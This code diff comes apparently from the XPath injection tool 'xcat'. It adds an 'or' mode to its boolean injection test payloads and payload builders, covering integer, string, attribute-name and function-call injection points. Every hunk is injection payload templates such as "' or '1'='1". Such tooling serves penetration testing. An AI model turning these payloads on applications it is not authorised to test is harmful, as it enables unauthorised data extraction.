@@ -33,13 +33,14 @@ logger = logging.getLogger("xcat.injectors")
 class Injection(object):
     example_text = None
 
-    def __init__(self, detector):
+    def __init__(self, detector, use_or=False):
         self.detector = detector
         self.working_value = self.detector.requests.param_value
         self.logger = logging.getLogger("xcat.injectors." + self.__class__.__name__)
         self.kind = None
 
         self.working_requests = []
+        self.use_or = use_or
 
     def test(self, unstable=False):
         payloads = self.create_test_payloads()
@@ -49,7 +50,9 @@ class Injection(object):
         for kind in payloads.keys():
 
             for payload, expected_result in payloads[kind]:
-                payload = payload.format(working=self.working_value)
+                cond = "or" if self.use_or else "and"
+
+                payload = payload.format(working=self.working_value, cond=cond)
                 logger.info("Testing payload %s", payload)
                 new_data = self.detector.requests.get_query_data(payload)
 
@@ -93,11 +96,14 @@ class IntegerInjection(Injection):
 
     def create_test_payloads(self):
         return (
-            ("{working} and 1=1", True),
-            ("{working} and 1=2", False)
+            ("{working} {cond} 1=1", True),
+            ("{working} {cond} 1=2", False)
         )
 
     def get_payload(self, expression):
+        if self.use_or:
+            return E(self.working_value) | expression
+
         return E(self.working_value) & expression
 
 
@@ -105,16 +111,19 @@ class StringInjection(Injection):
     def create_test_payloads(self):
         return {
             "'": [
-                ("{working}' and '1'='1", True),
-                ("{working}' and '1'='2", False)
+                ("{working}' {cond} '1'='1", True),
+                ("{working}' {cond} '1'='2", False)
             ],
             '"': [
-                ('{working}" and "1"="1', True),
-                ('{working}" and "1"="2', False)
+                ('{working}" {cond} "1"="1', True),
+                ('{working}" {cond} "1"="2', False)
             ]
         }
 
     def get_payload(self, expression):
+        if self.use_or:
+            return (E(self.working_value + self.kind) | expression) & L("'1'='1".replace("'", self.kind))
+
         return E(self.working_value + self.kind) & expression & L("'1'='1".replace("'", self.kind))
 
     def get_example(self):
@@ -127,17 +136,20 @@ class AttributeNameInjection(Injection):
     def create_test_payloads(self):
         return {
             "prefix": [
-                ("1=1 and {working}", True),
-                ("1=2 and {working}", False)
+                ("1=1 {cond} {working}", True),
+                ("1=2 {cond} {working}", False)
             ],
             "postfix": [
-                ("{working} and not 1=2 and {working}", True),
-                ("{working} and 1=2 and {working}", False)
+                ("{working} {cond} not 1=2 and {working}", True),
+                ("{working} {cond} 1=2 and {working}", False)
             ]
         }
 
     def get_payload(self, expression):
-        return expression & E(self.working_value)
+        if self.use_or:
+            return expression | E(self.working_value)
+        else:
+            return expression & E(self.working_value)
 
 
 class ElementNameInjection(Injection):
@@ -174,9 +186,12 @@ class FunctionCallInjection(Injection):
     def create_test_payloads(self):
         # ToDo: Make this work. Currently doesn't support anything likely to occur in the wild.
         return (
-            ("{working}') and true() and string('1'='1", True),
-            ("{working}') and false() and string('1'='1", False),
+            ("{working}') {cond} true() and string('1'='1", True),
+            ("{working}') {cond} false() and string('1'='1", False),
         )
 
     def get_payload(self, expression):
+        if self.use_or:
+            return "%s') or %s and string('1'='1" % (self.working_value, expression)
+
         return "%s') and %s and string('1'='1" % (self.working_value, expression)
